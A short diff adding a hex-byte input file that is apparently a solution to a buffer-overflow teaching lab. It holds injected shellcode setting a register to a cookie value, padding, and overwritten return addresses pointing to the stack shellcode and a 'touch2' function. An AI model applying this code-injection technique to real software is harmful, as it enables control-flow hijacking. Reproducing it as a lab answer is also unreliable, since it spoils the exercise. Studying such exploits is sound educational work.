@@ -1,0 +1,7 @@
+48 c7 c7 fa 97 b9 59 c3 /* mov    $0x59b997fa,%rdi and ret */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+78 dc 61 55 00 00 00 00 /* address of shellcode */
+ec 17 40 00 00 00 00 00 /* address of touch2 */
